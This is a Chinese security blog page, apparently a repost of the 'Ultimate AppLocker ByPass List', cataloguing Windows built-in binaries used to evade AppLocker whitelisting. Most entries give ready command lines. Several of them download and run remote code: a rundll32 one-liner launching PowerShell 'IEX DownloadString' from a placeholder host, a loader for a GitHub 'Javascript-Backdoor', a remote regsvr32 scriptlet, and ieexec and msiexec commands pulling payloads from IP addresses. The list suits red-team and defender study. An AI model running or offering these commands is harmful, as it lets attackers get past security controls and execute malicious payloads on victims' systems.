@@ -1,0 +1,1191 @@
+
+<!doctype html>
+<html class="theme-next use-motion theme-next-mala">
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5">
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1">
+
+
+    <meta name="description" content="kali|linux|sec|Web|MSF|Win">
+
+
+
+  <meta name="keywords" content="metasploit,web,kali_Linux,hacking,黑苹果,茶道,漏洞">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demonsec" type="application/atom+xml">
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1">
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ultimate AppLocker ByPass List">
+<meta property="og:url" content="www.ggsec.cn/UltimateAppLockerByPassList.html">
+<meta property="og:site_name" content="Demonsec">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/maxresdfault.jpg">
+<meta property="og:updated_time" content="2018-12-21T06:56:47.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Ultimate AppLocker ByPass List">
+<meta name="twitter:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/maxresdfault.jpg">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mala',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> Ultimate AppLocker ByPass List | Demonsec </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">Demonsec’S blog</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br>
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br>
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br>
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-linux">
+          <a href="/categories/linux" rel="section">
+            <i class="menu-item-icon icon-next-linux"></i> <br>
+            linux
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-windows">
+          <a href="/categories/windows" rel="section">
+            <i class="menu-item-icon icon-next-windows"></i> <br>
+            windows
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-haking">
+          <a href="/categories/haking" rel="section">
+            <i class="menu-item-icon icon-next-haking"></i> <br>
+            haking
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            <i class="menu-item-icon icon-next-web"></i> <br>
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-msf">
+          <a href="/categories/Metasploit" rel="section">
+            <i class="menu-item-icon icon-next-msf"></i> <br>
+            Metasploit
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-kali">
+          <a href="/categories/kali" rel="section">
+            <i class="menu-item-icon icon-next-kali"></i> <br>
+            kali
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tea">
+          <a href="/categories/tea" rel="section">
+            <i class="menu-item-icon icon-next-tea"></i> <br>
+            tea
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-黑苹果">
+          <a href="/categories/mac" rel="section">
+            <i class="menu-item-icon icon-next-黑苹果"></i> <br>
+            mac
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-逆向">
+          <a href="/categories/逆向" rel="section">
+            <i class="menu-item-icon icon-next-逆向"></i> <br>
+            逆向
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-music">
+          <a href="/music" rel="section">
+            <i class="menu-item-icon icon-next-music"></i> <br>
+            music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-每日安全干货及动态">
+          <a href="/categories/每日安全干货及动态" rel="section">
+            <i class="menu-item-icon icon-next-每日安全干货及动态"></i> <br>
+            每日安全干货及动态
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    
+      
+
+      
+        <style type="text/css">
+
+    .circle {
+        width: 40px;
+        height: 40px;
+        background: #555 no-repeat;
+        cursor: move;
+    }
+
+    .assist-btn {
+        position: fixed;
+        top: 50％;
+        left: 10px;
+        -moz-border-radius: 50px;
+        -webkit-border-radius: 50px;
+        border-radius: 50px;
+        outline: none;
+        border: none;
+        color: #87daff;
+    }
+
+</style>
+
+<script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+<script type="text/javascript">
+    // 浮动圆点展开与收缩
+    /*
+    $(function () {
+        var assist_box = $('.assist-box');
+        $('#assist_btn').hover(function () {
+            assist_box.stop().show(300);
+        }, function () {
+            assist_box.stop().hide(150);
+        })
+    });
+    */  
+    //浮动圆点拖动
+    $(function () {
+        var box = document.getElementById('assist_btn');
+        box.onmousedown = function (event) {
+            var e = event || window.event,
+                t = e.target || e.srcElement,
+                // 鼠标按下时的坐标x1,y1
+                x1 = e.clientX,
+                y1 = e.clientY,
+                //鼠标按下时的左右偏移量
+                dragLeft = this.offsetLeft,
+                dragTop = this.offsetTop;
+
+            document.onmousemove = function (event) {
+                var e = event || window.event,
+                    t = e.target || e.srcElement,
+                    // 鼠标移动时的动态坐标
+                    x2 = e.clientX,
+                    y2 = e.clientY,
+                    // 鼠标移动时的坐标的变化量
+                    x = x2 - x1,
+                    y = y2 - y1;
+                box.style.left = (dragLeft + x) + 'px';
+                box.style.top = (dragTop + y) + 'px';
+            }
+
+            document.onmouseup = function () {
+                this.onmousemove = null;
+            }
+        }
+    });
+
+/*
+    $whitesmoke   = #f5f5f5
+    $gainsboro    = #eee
+    $gray-lighter = #ddd
+    $grey-light   = #ccc
+    $grey         = #bbb
+    $grey-dark    = #999
+    $grey-dim     = #666
+    $black-light  = #555
+    $black-deep   = #222
+    $red          = #ff2a2a
+    $blue-bright  = #87daff
+    $blue         = #0684bd
+    $blue-deep    = #262a30
+*/
+    // white theme
+    var body = {color: "#555", background: "white"};
+    var a_tag = {color: "#222"};
+    var header = { background: "#f5f5f5"};
+    var logo_line_i = {background: "#222"};
+    // var post_code = {background: "#eee", color: "#222"};
+
+    function switch_theme() {
+        $("body").css(body);
+        $("a:not('.links-of-author-item a, .site-state-item a, .site-state-posts a, .feed-link a, .motion-element a, .post-tags a, .show-commit-cls a, #donate_board a')").css(a_tag);
+        $(".header, .footer").css(header);
+        $(".logo-line-before i, .logo-line-after i").css(logo_line_i);
+        //$(".post code").css(post_code);
+        $("#idhyt-surprise-ball #idhyt-surprise-ball-animation .drag").css(a_tag);
+        $(".post-title-link, .posts-expand .post-meta, .post-comments-count, .disqus-comment-count, .post-category a, .post-nav-next a, .post-nav-item a").css(a_tag);
+        
+        // $("code").css({color: '#c5c8c6', background: '#1d1f21'});
+        $("#assist_btn").hide(1500);
+    }
+
+    $(function () {
+        $("#assist_btn").dblclick(function() {
+            switch_theme();
+        });
+    });
+
+</script>
+
+<div>
+
+    <button class="assist-btn circle" id="assist_btn" title="双击切换">
+        亮
+    </button>
+
+</div>
+
+
+
+
+
+
+
+
+
+      
+
+    
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              Ultimate AppLocker ByPass List
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2018-01-04T22:13:19+08:00" content="2018-01-04">
+            2018-01-04
+          </time>
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/每日安全干货及动态/" itemprop="url" rel="index">
+                  <span itemprop="name">每日安全干货及动态</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <!--
+              <a href="/UltimateAppLockerByPassList.html#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="UltimateAppLockerByPassList.html" itemprop="commentsCount"></span>
+              </a>
+              -->
+              <a href="/UltimateAppLockerByPassList.html#comments" itemprop="discussionUrl">
+                <span>评论</span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/maxresdfault.jpg" alt="enter description here"><br><a id="more"></a><br>GIthub ：<a href="https://github.com/api0cradle/UltimateAppLockerByPassList" target="_blank" rel="noopener">https://github.com/api0cradle/UltimateAppLockerByPassList</a><br>此存储库的目标是记录最常用的技术来绕过AppLocker。本自述文件包含所有已知绕过路径的完整列表。由于AppLocker可以以不同的方式进行配置，所以有一个绕过主列表是有意义的。这README.MD将是主，并将更新已知和可能的AppLocker绕过。</p>
+<p>我已经创建了一个验证Bypass列表，再次使用AppLocker创建的默认规则。</p>
+<p>有关我如何验证的详细信息，可以查看他的博客：<a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/" target="_blank" rel="noopener">https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</a></p>
+<p>VerifiedBypasses-DefaultRules.MD</p>
+<p>如果您想知道如何创建默认规则，您可以按照以下指南进行操作：https： //<a href="http://www.rootusers.com/implement-applocker-rules/" target="_blank" rel="noopener">www.rootusers.com/implement-applocker-rules/</a></p>
+<p>请贡献并指出我忘记的错误或资源。请记住，必须验证BypassDLL和BypassEXE的旁路技术。BypassDLL-DefaultRules和BypassEXE-DefaultRules列表应该只包含有效的绕过。</p>
+<h2 id="Rundll32-exe"><a href="#Rundll32-exe" class="headerlink" title="Rundll32.exe"></a>Rundll32.exe</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();new%20A</span><br><span class="line"><span class="function"><span class="title">ctiveXObject</span><span class="params">(<span class="string">"WScript.Shell"</span>)</span></span>.Run(<span class="string">"powershell -nop -exec bypass -c IEX (New-Object</span></span><br><span class="line"><span class="string">Net.WebClient).DownloadString('http://ip:port/');"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXO</span><br><span class="line">bject(\"WScript.Shell\");w.run(\"calc\");window.close()");`</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20A</span><br><span class="line">ctiveXObject("WScript.Shell").run("calc.exe",0,true);try&#123;h.Send();b=h.ResponseT</span><br><span class="line">ext;eval(b;&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill </span><br><span class="line">/f /im rundll32.exe<span class="string">",0,true);&#125;`</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetOb</span><br><span class="line">ject(<span class="string">"script:https://raw.githubusercontent.com/3gstudent/</span></span><br><span class="line"><span class="string">Javascript-Backdoor/master/test"</span>)`</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`rundll32 shell32<span class="selector-class">.dll</span>,Control_RunDLL payload.dll`</span><br></pre></td></tr></table></figure>
+<p>Requires admin: No</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/" target="_blank" rel="noopener">https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/</a><br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7" target="_blank" rel="noopener">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Rundll32.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Rundll32.md</a></p>
+<h2 id="Regsvr32-exe"><a href="#Regsvr32-exe" class="headerlink" title="Regsvr32.exe"></a>Regsvr32.exe</h2><p>regsvr32 /s /n /u /i:<a href="http://example.com/file.sct" target="_blank" rel="noopener">http://example.com/file.sct</a> scrobj.dll`</p>
+<p>Requires admin: No</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302" target="_blank" rel="noopener">https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md</a></p>
+<h2 id="Msbuild-exe"><a href="#Msbuild-exe" class="headerlink" title="Msbuild.exe"></a>Msbuild.exe</h2><p><code>msbuild.exe pshell.xml</code></p>
+<p>Requires admin: No</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614" target="_blank" rel="noopener">https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614</a><br><a href="http://subt0x10.blogspot.no/2017/04/bypassing-application-whitelisting.html" target="_blank" rel="noopener">http://subt0x10.blogspot.no/2017/04/bypassing-application-whitelisting.html</a><br><a href="https://github.com/Cn33liz/MSBuildShell" target="_blank" rel="noopener">https://github.com/Cn33liz/MSBuildShell</a><br><a href="https://github.com/Cn33liz/MS17-012" target="_blank" rel="noopener">https://github.com/Cn33liz/MS17-012</a><br><a href="https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/" target="_blank" rel="noopener">https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/</a><br><a href="https://www.youtube.com/watch?v=aSDEAPXaz28" target="_blank" rel="noopener">https://www.youtube.com/watch?v=aSDEAPXaz28</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md</a></p>
+<h2 id="Regsvcs-exe"><a href="#Regsvcs-exe" class="headerlink" title="Regsvcs.exe"></a>Regsvcs.exe</h2><p><code>regsvcs.exe /U regsvcs.dll</code><br><code>regsvcs.exe regsvcs.dll</code></p>
+<p>Requires admin: ?</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/" target="_blank" rel="noopener">https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md</a></p>
+<h2 id="Regasm-exe"><a href="#Regasm-exe" class="headerlink" title="Regasm.exe"></a>Regasm.exe</h2><p><code>regasm.exe /U regsvcs.dll</code><br><code>regasm.exe regsvcs.dll</code></p>
+<p>Requires admin: ?</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/" target="_blank" rel="noopener">https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md</a></p>
+<h2 id="Bginfo-exe"><a href="#Bginfo-exe" class="headerlink" title="Bginfo.exe"></a>Bginfo.exe</h2><p><code>bginfo.exe bginfo.bgi /popup /nolicprompt</code></p>
+<p>Requires admin: No</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://msitpros.com/?p=3831" target="_blank" rel="noopener">https://msitpros.com/?p=3831</a><br><a href="https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/" target="_blank" rel="noopener">https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/</a><br><a href="https://msitpros.com/?p=3860" target="_blank" rel="noopener">https://msitpros.com/?p=3860</a></p>
+<h2 id="InstallUtil-exe"><a href="#InstallUtil-exe" class="headerlink" title="InstallUtil.exe"></a>InstallUtil.exe</h2><p><code>InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll</code></p>
+<p>Requires admin: No</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://github.com/subTee/AllTheThings" target="_blank" rel="noopener">https://github.com/subTee/AllTheThings</a><br><a href="https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/" target="_blank" rel="noopener">https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/</a><br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12" target="_blank" rel="noopener">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12</a><br><a href="http://subt0x10.blogspot.no/2017/09/banned-file-execution-via.html" target="_blank" rel="noopener">http://subt0x10.blogspot.no/2017/09/banned-file-execution-via.html</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/InstallUtil.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/InstallUtil.md</a></p>
+<h2 id="MSDT-exe"><a href="#MSDT-exe" class="headerlink" title="MSDT.exe"></a>MSDT.exe</h2><p><code>Open .diagcab package</code></p>
+<p>Requires admin: ?</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/" target="_blank" rel="noopener">https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/</a></p>
+<h2 id="mshta-exe"><a href="#mshta-exe" class="headerlink" title="mshta.exe"></a>mshta.exe</h2><p><code>mshta.exe evilfile.hta</code></p>
+<p>Requires admin: No</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4" target="_blank" rel="noopener">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4</a></p>
+<h2 id="Execute-Bat"><a href="#Execute-Bat" class="headerlink" title="Execute .Bat"></a>Execute .Bat</h2><p><code>cmd.exe /k &lt; script.txt</code></p>
+<p>Requires admin: No</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3" target="_blank" rel="noopener">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3</a></p>
+<h2 id="Execute-PS1"><a href="#Execute-PS1" class="headerlink" title="Execute .PS1"></a>Execute .PS1</h2><p><code>Get-Content script.txt | iex</code></p>
+<p>Requires admin: No</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3" target="_blank" rel="noopener">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3</a></p>
+<h2 id="Execute-VBS"><a href="#Execute-VBS" class="headerlink" title="Execute .VBS"></a>Execute .VBS</h2><p><code>cscript.exe //E:vbscript script.txt</code></p>
+<p>Requires admin: No</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3" target="_blank" rel="noopener">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3</a></p>
+<h2 id="PresentationHost-exe"><a href="#PresentationHost-exe" class="headerlink" title="PresentationHost.exe"></a>PresentationHost.exe</h2><p>Missing Example</p>
+<p>Requires admin: ?</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf" target="_blank" rel="noopener">https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf</a></p>
+<h2 id="dfsvc-exe"><a href="#dfsvc-exe" class="headerlink" title="dfsvc.exe"></a>dfsvc.exe</h2><p>Missing Example</p>
+<p>Requires admin: ?</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf" target="_blank" rel="noopener">https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf</a></p>
+<h2 id="IEExec-exe"><a href="#IEExec-exe" class="headerlink" title="IEExec.exe"></a>IEExec.exe</h2><p><code>ieexec.exe http://x.x.x.x:8080/bypass.exe</code></p>
+<p>Requires admin: ?</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/" target="_blank" rel="noopener">https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/</a></p>
+<h2 id="cdb-exe"><a href="#cdb-exe" class="headerlink" title="cdb.exe"></a>cdb.exe</h2><p><code>cdb.exe -cf x64_calc.wds -o notepad.exe</code></p>
+<p>Requires admin: ?</p>
+<p>Notes:</p>
+<p>Links:<br><a href="http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html" target="_blank" rel="noopener">http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html</a></p>
+<h2 id="dnx-exe"><a href="#dnx-exe" class="headerlink" title="dnx.exe"></a>dnx.exe</h2><p><code>dnx.exe consoleapp</code></p>
+<p>Requires admin: ?</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/" target="_blank" rel="noopener">https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/</a></p>
+<h2 id="rcsi-exe"><a href="#rcsi-exe" class="headerlink" title="rcsi.exe"></a>rcsi.exe</h2><p><code>rcsi.exe bypass.csx</code></p>
+<p>Requires admin: ?</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/" target="_blank" rel="noopener">https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/</a></p>
+<h2 id="csi-exe"><a href="#csi-exe" class="headerlink" title="csi.exe"></a>csi.exe</h2><p>Missing example</p>
+<p>Requires admin: ?</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html" target="_blank" rel="noopener">https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html</a></p>
+<h2 id="CPL-loading-location-manipulation"><a href="#CPL-loading-location-manipulation" class="headerlink" title="CPL loading location manipulation"></a>CPL loading location manipulation</h2><p><code>Control.exe</code></p>
+<p>Requires admin: No</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/" target="_blank" rel="noopener">https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/</a><br><a href="https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/" target="_blank" rel="noopener">https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/</a></p>
+<h2 id="msxsl-exe"><a href="#msxsl-exe" class="headerlink" title="msxsl.exe"></a>msxsl.exe</h2><p><code>msxsl.exe customers.xml script.xsl</code></p>
+<p>Requires admin: No</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/" target="_blank" rel="noopener">https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/</a><br><a href="https://gist.github.com/subTee/d9380299ff35738723cb44f230ab39a1" target="_blank" rel="noopener">https://gist.github.com/subTee/d9380299ff35738723cb44f230ab39a1</a></p>
+<h2 id="msiexec-exe"><a href="#msiexec-exe" class="headerlink" title="msiexec.exe"></a>msiexec.exe</h2><p><code>msiexec /quiet /i cmd.msi</code><br><code>msiexec /q /i http://192.168.100.3/tmp/cmd.png</code></p>
+<p>Requires admin: ?</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/" target="_blank" rel="noopener">https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/</a></p>
+<h2 id="cmstp-exe"><a href="#cmstp-exe" class="headerlink" title="cmstp.exe"></a>cmstp.exe</h2><p><code>cmstp.exe /ni /s c:\cmstp\CorpVPN.inf</code></p>
+<p>Requires admin: No</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://msitpros.com/?p=3960" target="_blank" rel="noopener">https://msitpros.com/?p=3960</a><br><a href="https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e" target="_blank" rel="noopener">https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e</a></p>
+<h2 id="xwizard-exe"><a href="#xwizard-exe" class="headerlink" title="xwizard.exe"></a>xwizard.exe</h2><p><code>xwizard.exe argument1 argument2</code><br>DLL loading in same folder xwizard.dll</p>
+<p>Requires admin: No</p>
+<p>Notes:</p>
+<p>Links:<br><a href="http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/" target="_blank" rel="noopener">http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/</a></p>
+<h2 id="fsi-exe"><a href="#fsi-exe" class="headerlink" title="fsi.exe"></a>fsi.exe</h2><p><code>fsi.exe c:\folder\d.fscript</code></p>
+<p>Requires admin: No</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1" target="_blank" rel="noopener">https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1</a><br><a href="https://twitter.com/NickTyrer/status/904273264385589248" target="_blank" rel="noopener">https://twitter.com/NickTyrer/status/904273264385589248</a><br><a href="https://docs.microsoft.com/en-us/dotnet/fsharp/tutorials/fsharp-interactive/" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/dotnet/fsharp/tutorials/fsharp-interactive/</a></p>
+<h2 id="odbcconf-exe"><a href="#odbcconf-exe" class="headerlink" title="odbcconf.exe"></a>odbcconf.exe</h2><p><code>odbcconf -f file.rsp</code></p>
+<p>Requires admin: ?</p>
+<p>Notes:</p>
